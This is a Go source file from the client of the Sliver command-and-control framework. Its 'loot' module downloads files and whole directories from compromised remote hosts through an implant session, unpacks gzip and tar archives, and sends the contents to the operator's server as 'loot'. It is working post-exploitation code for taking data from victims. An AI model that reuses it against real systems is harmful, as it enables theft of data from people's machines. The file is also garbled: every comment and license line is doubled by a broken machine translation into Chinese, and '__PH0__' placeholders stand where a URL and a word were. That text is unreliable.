package loot

/*
	Sliver Implant Framework
	Copyright (C) 2021  Bishop Fox
	Copyright (C) 2021 Bishop Fox

	This program is free software: you can redistribute it and/or modify
	This 程序是免费软件：您可以重新分发它 and/or 修改
	it under the terms of the GNU General Public License as published by
	它根据 GNU General Public License 发布的条款
	the Free Software Foundation, either version 3 of the License, or
	Free Software Foundation，License 的版本 3，或
	(at your option) any later version.
	（由您选择）稍后 version.

	This program is distributed in the hope that it will be useful,
	This 程序被分发，希望它有用，
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	但是WITHOUT ANY WARRANTY；甚至没有默示保证
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	MERCHANTABILITY 或 FITNESS FOR A PARTICULAR PURPOSE. See
	GNU General Public License for more details.
	GNU General Public License 更多 details.

	You should have received a copy of the GNU General Public License
	You 应已收到 GNU General Public License 的副本
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
	与此 program. If 不一起，请参见 <__PH0__
*/

import (
	"archive/tar"
	"bytes"
	"compress/gzip"
	"context"
	"fmt"
	"io"
	"path/filepath"
	"strings"

	"github.com/spf13/cobra"
	"google.golang.org/protobuf/proto"

	"github.com/bishopfox/sliver/client/console"
	"github.com/bishopfox/sliver/protobuf/clientpb"
	"github.com/bishopfox/sliver/protobuf/commonpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
	"github.com/bishopfox/sliver/util/encoders"
)

func ValidateLootFileType(lootFileTypeInput string, data []byte) clientpb.FileType {
	lootFileType, err := lootFileTypeFromHumanStr(lootFileTypeInput)
	if lootFileType == -1 || err != nil {
		if isText(data) {
			lootFileType = clientpb.FileType_TEXT
		} else {
			lootFileType = clientpb.FileType_BINARY
		}
	}

	return lootFileType
}

/*
Eventually this function needs to be refactored out, but we made the decision to
Eventually 这个函数需要重构，但我们决定
duplicate it for now
暂时复制它
*/
func PerformDownload(remotePath string, fileName string, cmd *cobra.Command, con *console.SliverClient) (*sliverpb.Download, error) {
	ctrl := make(chan bool)
	con.SpinUntil(fmt.Sprintf("%s -> %s", fileName, "loot"), ctrl)
	download, err := con.Rpc.Download(context.Background(), &sliverpb.DownloadReq{
		Request: con.ActiveTarget.Request(cmd),
		Path:    remotePath,
	})
	ctrl <- true
	<-ctrl
	if err != nil {
		return nil, err
	}
	if download.Response != nil && download.Response.Async {
		con.AddBeaconCallback(download.Response.TaskID, func(task *clientpb.BeaconTask) {
			err = proto.Unmarshal(task.Response, download)
			if err != nil {
				con.PrintErrorf("Failed to decode response %s\n", err)
			}
		})
		con.PrintAsyncResponse(download.Response)
	}

	if download.Response != nil && download.Response.Err != "" {
		return nil, fmt.Errorf("%s", download.Response.Err)
	}

	// Decode the downloaded data if required
	// Decode 下载的数据（如果需要）
	if download.Encoder == "gzip" {
		download.Data, err = new(encoders.Gzip).Decode(download.Data)
		if err != nil {
			return nil, fmt.Errorf("decoding failed %s", err)
		}
	}

	return download, nil
}

func CreateLootMessage(hostUUID string, fileName string, lootName string, lootFileType clientpb.FileType, data []byte) *clientpb.Loot {
	if lootName == "" {
		lootName = fileName
	}
	lootMessage := &clientpb.Loot{
		Name:           lootName,
		OriginHostUUID: hostUUID,
		FileType:       lootFileType,
		File: &commonpb.File{
			Name: fileName,
			Data: data,
		},
	}
	return lootMessage
}

func SendLootMessage(loot *clientpb.Loot, con *console.SliverClient) {
	control := make(chan bool)
	con.SpinUntil(fmt.Sprintf("Sending looted file (%s) to the server...", loot.Name), control)

	loot, err := con.Rpc.LootAdd(context.Background(), loot)
	control <- true
	<-control
	if err != nil {
		con.PrintErrorf("%s\n", err)
	}

	if loot.Name != loot.File.Name {
		con.PrintInfof("Successfully looted %s (%s) (ID: %s)\n", loot.File.Name, loot.Name, loot.ID)
	} else {
		con.PrintInfof("Successfully looted %s (ID: %s)\n", loot.Name, loot.ID)
	}
}

func LootDownload(download *sliverpb.Download, lootName string, fileType clientpb.FileType, cmd *cobra.Command, con *console.SliverClient) {
	// Was the download successful?
	// Was 下载成功吗？
	if download.Response != nil && download.Response.Err != "" {
		con.PrintErrorf("%s\n", download.Response.Err)
		return
	}

	/*
		Construct everything needed to send the loot to the server
		Construct 将战利品发送到服务器所需的一切
		If this is a directory, we will process each file individually
		If 这是一个目录，我们将单独处理每个文件
	*/

	// Let's handle the simple case of a file first
	// Let 首先处理文件的简单情况
	if !download.IsDir {
		// filepath.Base does not deal with backslashes correctly in Windows paths, so we have to standardize the path to forward slashes
		// filepath.Base 不能正确处理 Windows 路径中的反斜杠，因此我们必须将路径标准化为正斜杠
		downloadPath := strings.ReplaceAll(download.Path, "\\", "/")
		lootMessage := CreateLootMessage(con.ActiveTarget.GetHostUUID(), filepath.Base(downloadPath), lootName, fileType, download.Data)
		SendLootMessage(lootMessage, con)
	} else {
		// We have to decompress the gzip file first
		// We 必须先解压缩 gzip 文件
		decompressedDownload, err := gzip.NewReader(bytes.NewReader(download.Data))
		if err != nil {
			con.PrintErrorf("Could not decompress downloaded data: %s", err)
			return
		}

		/*
			Directories are stored as tar-ed gzip archives.
			Directories 存储为 tar__PH0__ gzip archives.
			We have gotten rid of the gzip part, now we have to sort out the tar
			We 已经摆脱了 gzip 部分，现在我们必须整理 tar
		*/
		tarReader := tar.NewReader(decompressedDownload)

		// Keep reading until we reach the end
		// Keep 阅读直到读到最后
		for {
			entryHeader, err := tarReader.Next()
			if err == io.EOF {
				// We have reached the end of the tar archive
				// We 已到达 tar 存档的末尾
				break
			}

			if err != nil {
				// Something is wrong with this archive. Stop reading.
				// Something 这个 archive. Stop reading. 是错误的
				break
			}

			if entryHeader == nil {
				/*
					If the entry is nil, skip it (not sure when this would happen,
					If 该条目为零，跳过它（不确定什么时候会发生，
						but we do not want to attempt operations on something that is nil)
						但我们不想尝试对零的东西进行操作）
				*/
				continue
			}

			if entryHeader.Typeflag == tar.TypeDir {
				// Keep going to dig into the directory
				// Keep 将深入目录
				continue
			}
			// The implant should have only shipped us files (the implant resolves symlinks)
			// The implant 应该只向我们发送文件（implant 解析符号链接）

			// Create a loot message for this file and ship it
			// Create 该文件的战利品消息并将其发送
			/* Using io.ReadAll because it reads until EOF. We have already read the header, so the next EOF should
 Using io.ReadAll 因为它读取直到 EOF. We 已经读取了标头，所以下一个 EOF 应该
			be the end of the file
			是文件的末尾
			*/
			fileData, err := io.ReadAll(tarReader)
			if err == nil {
				lootMessage := CreateLootMessage(con.ActiveTarget.GetHostUUID(), filepath.Base(entryHeader.Name), lootName, fileType, fileData)
				SendLootMessage(lootMessage, con)
			}
		}
	}
}

func LootText(text string, lootName string, lootFileName string, fileType clientpb.FileType, con *console.SliverClient) {
	lootMessage := CreateLootMessage(con.ActiveTarget.GetHostUUID(), lootFileName, lootName, fileType, []byte(text))
	SendLootMessage(lootMessage, con)
}

func LootBinary(data []byte, lootName string, lootFileName string, fileType clientpb.FileType, con *console.SliverClient) {
	lootMessage := CreateLootMessage(con.ActiveTarget.GetHostUUID(), lootFileName, lootName, fileType, data)
	SendLootMessage(lootMessage, con)
}

// LootAddRemoteCmd - Add a file from the remote system to the server as loot
// LootAddRemoteCmd - Add 从远程系统到服务器的文件作为战利品
func LootAddRemoteCmd(cmd *cobra.Command, con *console.SliverClient, args []string) {
	session := con.ActiveTarget.GetSessionInteractive()
	if session == nil {
		return
	}
	remotePath := args[0]
	fileName := filepath.Base(remotePath)
	name, _ := cmd.Flags().GetString("name")

	download, err := PerformDownload(remotePath, fileName, cmd, con)
	if err != nil {
		con.PrintErrorf("%s\n", err)
		return
	}

	// Determine type based on download buffer
	// 基于下载缓冲区的 Determine 类型
	fileType, _ := cmd.Flags().GetString("file-type")
	lootFileType := ValidateLootFileType(fileType, download.Data)
	LootDownload(download, name, lootFileType, cmd, con)
}
